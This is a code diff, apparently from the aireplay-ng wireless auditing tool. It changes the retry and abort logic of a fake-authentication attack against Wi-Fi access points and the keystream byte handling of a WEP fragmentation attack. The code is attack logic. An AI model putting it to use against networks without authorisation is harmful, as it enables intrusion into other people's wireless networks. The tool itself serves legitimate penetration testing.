@@ -860,6 +860,8 @@ int do_attack_fake_auth( void )
     int x_send;
     int ret;
     int kas;
+    int tries;
+    int abort;
 
     unsigned char ackbuf[14];
 
@@ -885,6 +887,8 @@ int do_attack_fake_auth( void )
     memcpy( ackbuf +  4, opt.r_bssid, 6 );
     memset( ackbuf + 10, 0, 4 );
 
+    tries = 0;
+    abort = 0;
     state = 0;
     x_send = 4;
     if(opt.npackets > 0) x_send = opt.npackets;
@@ -926,14 +930,34 @@ int do_attack_fake_auth( void )
 
                 if( time( NULL ) - tt >= 2 )
                 {
-                    if( x_send < 256 && (opt.npackets == -1) )
-                        x_send *= 2;
+                    if(opt.npackets > 0)
+                    {
+                        tries++;
+
+                        if( tries > 15  )
+                        {
+                            abort = 1;
+                        }
+                    }
                     else
+                    {
+                        if( x_send < 256 )
+                        {
+                            x_send *= 2;
+                        }
+                        else
+                        {
+                            abort = 1;
+                        }
+                    }
+
+                    if( abort )
                     {
                         printf(
     "\nAttack was unsuccessful. Possible reasons:\n\n"
     "    * Perhaps MAC address filtering is enabled.\n"
     "    * Check that the BSSID (-a option) is correct.\n"
+    "    * Try to change the number of packets (-o option).\n"
     "    * The driver hasn't been patched for injection.\n"
     "    * This attack sometimes fails against some APs.\n"
     "    * The card is not on the same channel as the AP.\n"
@@ -951,6 +975,7 @@ int do_attack_fake_auth( void )
 
             case 2:
 
+                tries = 0;
                 state = 3;
                 if(opt.npackets == -1) x_send *= 2;
                 tt = time( NULL );
@@ -2756,18 +2781,12 @@ int do_attack_fragment()
         caplen2 = caplen;
         printf("Data packet found!\n");
 
-        switch( packet2[1] & 3 )
+        if ( memcmp( packet2 +  4, SPANTREE, 6 ) == 0 ||
+             memcmp( packet2 + 16, SPANTREE, 6 ) == 0 )
         {
-            case  0: memcpy( dest, packet2 +  4, 6 ); break;
-            case  1: memcpy( dest, packet2 + 16, 6 ); break;
-            case  2: memcpy( dest, packet2 +  4, 6 ); break;
-            default: memcpy( dest, packet2 + 16, 6 ); break;
-        }
-
-        if(memcmp( dest, SPANTREE, 6) == 0)
-        {
-            packet2[28] = ((packet2[28] ^ 0x42) ^ 0xAA);
-            packet2[29] = ((packet2[29] ^ 0x42) ^ 0xAA);
+            packet2[28] = ((packet2[28] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
+            packet2[29] = ((packet2[29] ^ 0x42) ^ 0xAA);  //0x42 instead of 0xAA
+            packet2[34] = ((packet2[34] ^ 0x00) ^ 0x08);  //0x00 instead of 0x08
         }
 
         prga_len = 7;
